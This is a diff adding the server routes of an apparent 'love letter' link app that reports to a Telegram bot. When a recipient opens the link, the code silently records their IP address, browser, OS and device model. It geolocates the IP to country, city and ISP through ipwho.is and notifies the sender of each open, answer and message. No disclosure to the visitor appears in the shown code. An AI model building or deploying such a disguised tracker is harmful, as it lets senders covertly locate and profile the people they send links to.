@@ -1,0 +1,205 @@
+const path = require('path');
+const https = require('https');
+const { Markup } = require('telegraf');
+const UAParser = require('ua-parser-js');
+const { CATEGORY_CONFIGS } = require('./category');
+
+function setupRoutes(app, db, saveDB, bot) {
+    app.post('/api/get-content', async (req, res) => {
+        try {
+            const linkId = req.body.id;
+            const data = db.linkDatabase[linkId];
+            if (!data) return res.json({ success: false });
+            
+            bot.telegram.sendMessage(data.userId, `👀 লিংক ওপেন করা হয়েছে!`).catch(() => {});
+            
+            let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "";
+            let ip = rawIp.split(',')[0].trim();
+            if (ip.includes('::ffff:')) ip = ip.replace('::ffff:', '');
+            
+            const userAgent = req.headers['user-agent'] || "";
+            const uaResult = new UAParser(userAgent).getResult();
+            const currentTimeString = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });
+            
+            let clientDevice = req.body.deviceInfo || {};
+            
+            let deviceModel = clientDevice.model || uaResult.device.model || "Unknown";
+            let deviceVendor = clientDevice.vendor || uaResult.device.vendor || "Unknown";
+            let deviceType = clientDevice.type || uaResult.device.type || "Unknown";
+            let osName = clientDevice.osName || uaResult.os.name || "Unknown";
+            let osVersion = clientDevice.osVersion || uaResult.os.version || "Unknown";
+
+            if (osName.toLowerCase() === "android" && (osVersion === "Unknown" || osVersion === "10" || osVersion === "11")) {
+                let androidMatch = userAgent.match(/Android\s([0-9\.]+)/i);
+                if (androidMatch) {
+                    osVersion = androidMatch[1];
+                }
+            }
+
+            if (userAgent.match(/Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i)) {
+                if (deviceType === "Unknown" || deviceType === "Desktop/Unknown") {
+                    deviceType = "mobile";
+                }
+            }
+
+            if (!deviceModel || deviceModel === "Unknown" || deviceModel === "K") {
+                if (userAgent.includes("Redmi") || userAgent.includes("MI") || userAgent.includes("M2") || userAgent.includes("POCO")) {
+                    let match = userAgent.match(/(M\d{2}[A-Za-z0-9]+|Redmi\s[^\s)]+|Xiaomi\s[^\s)]+|POCO\s[^\s)]+)/i);
+                    if (match) {
+                        deviceModel = match[0];
+                        deviceVendor = "Xiaomi";
+                    }
+                } else if (userAgent.includes("Samsung") || userAgent.includes("SM-")) {
+                    let match = userAgent.match(/(SM-[A-Za-z0-9]+)/i);
+                    if (match) {
+                        deviceModel = match[1];
+                        deviceVendor = "Samsung";
+                    }
+                } else if (userAgent.includes("Vivo")) {
+                    let match = userAgent.match(/(Vivo\s[^\s)]+|V\d{4}[A-Za-z0-9]*)/i);
+                    if (match) {
+                        deviceModel = match[0];
+                        deviceVendor = "Vivo";
+                    }
+                } else if (userAgent.includes("OPPO")) {
+                    let match = userAgent.match(/(OPPO\s[^\s)]+|CPH\d{4})/i);
+                    if (match) {
+                        deviceModel = match[0];
+                        deviceVendor = "OPPO";
+                    }
+                } else if (userAgent.includes("Realme")) {
+                    let match = userAgent.match(/(Realme\s[^\s)]+|RMX\d{4})/i);
+                    if (match) {
+                        deviceModel = match[0];
+                        deviceVendor = "Realme";
+                    }
+                } else if (userAgent.includes("OnePlus")) {
+                    let match = userAgent.match(/(OnePlus\s[^\s)]+|IN\d{4}|LE\d{4}|EB\d{4}|NE\d{4}|CPH\d{4})/i);
+                    if (match) {
+                        deviceModel = match[0];
+                        deviceVendor = "OnePlus";
+                    }
+                }
+            }
+            
+            let visitorObj = {
+                time: currentTimeString, 
+                ip: ip, 
+                country: "Unknown", 
+                city: "Unknown", 
+                isp: "Unknown", 
+                browserName: uaResult.browser.name || "Unknown",
+                browserVersion: uaResult.browser.version || "Unknown",
+                osName: osName,
+                osVersion: osVersion,
+                deviceVendor: deviceVendor,
+                deviceModel: deviceModel,
+                deviceType: deviceType,
+                cpuArchitecture: clientDevice.architecture || uaResult.cpu.architecture || "Unknown",
+                engineName: uaResult.engine.name || "Unknown",
+                engineVersion: uaResult.engine.version || "Unknown",
+                answer: null,
+                message: null
+            };
+            
+            if (!data.visitors) data.visitors = [];
+            data.visitors.push(visitorObj);
+            const visitorIndex = data.visitors.length - 1;
+            
+            if (ip && ip !== "127.0.0.1" && ip !== "::1") {
+                https.get(`https://ipwho.is/${ip}`, (apiRes) => {
+                    let body = "";
+                    apiRes.on('data', chunk => body += chunk);
+                    apiRes.on('end', () => {
+                        try {
+                            const ipData = JSON.parse(body);
+                            if (ipData.success && data.visitors[visitorIndex]) {
+                                data.visitors[visitorIndex].country = ipData.country || "Unknown";
+                                data.visitors[visitorIndex].city = ipData.city || "Unknown";
+                                data.visitors[visitorIndex].isp = ipData.connection?.isp || ipData.connection?.org || "Unknown";
+                            }
+                        } catch (e) {}
+                        saveDB();
+                    });
+                }).on('error', (err) => {
+                    saveDB();
+                });
+            } else {
+                await saveDB();
+            }
+            
+            if (data.countdown && new Date(data.countdown) > new Date()) {
+                return res.json({ success: true, isLocked: true, countdownTime: data.countdown, visitorIndex });
+            }
+            
+            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
+            return res.json({ 
+                success: true, isLocked: false, visitorIndex, title: config.title, music: data.music, 
+                animations: data.animations, letter: data.letter, emojis: data.emojis, 
+                question: config.question, buttons: config.buttons, image: data.image || null 
+            });
+        } catch (err) { 
+            res.json({ success: false }); 
+        }
+    });
+
+    app.post('/api/open-envelope', async (req, res) => {
+        try {
+            const { id } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+
+            bot.telegram.sendMessage(data.userId, `👁️‍🗨️ খাম খোলা হয়েছে!`).catch(() => {});
+            return res.json({ success: true });
+        } catch (err) {
+            res.json({ success: false });
+        }
+    });
+
+    app.post('/api/submit-answer', async (req, res) => {
+        try {
+            const { id, answer, visitorIndex } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+            
+            if (visitorIndex !== undefined && data.visitors && data.visitors[visitorIndex]) {
+                data.visitors[visitorIndex].answer = answer;
+            } else if (data.visitors && data.visitors.length > 0) {
+                data.visitors[data.visitors.length - 1].answer = answer;
+            }
+            await saveDB();
+            
+            const config = CATEGORY_CONFIGS[data.type] || CATEGORY_CONFIGS['love'];
+            bot.telegram.sendMessage(data.userId, `📨 নোটিফিকেশন!\nQuestion: ${config.question}\nAns: ${answer}`).catch(() => {});
+            
+            return res.json({ success: true });
+        } catch (err) { 
+            res.json({ success: false }); 
+        }
+    });
+
+    app.post('/api/submit-message', async (req, res) => {
+        try {
+            const { id, message, visitorIndex } = req.body;
+            const data = db.linkDatabase[id];
+            if (!data) return res.json({ success: false });
+
+            if (visitorIndex !== undefined && data.visitors && data.visitors[visitorIndex]) {
+                data.visitors[visitorIndex].message = message;
+            } else if (data.visitors && data.visitors.length > 0) {
+                data.visitors[data.visitors.length - 1].message = message;
+            }
+            await saveDB();
+
+            bot.telegram.sendMessage(data.userId, `📨 মেসেজ: ${message}`).catch(() => {});
+
+            return res.json({ success: true });
+        } catch (err) {
+            res.json({ success: false });
+        }
+    });
+
+    app.get('/love/:id', (req, res) => res.sendFile(path.join(__dirname, '../index.html')));
+}
+
+module.exports = { setupRoutes };
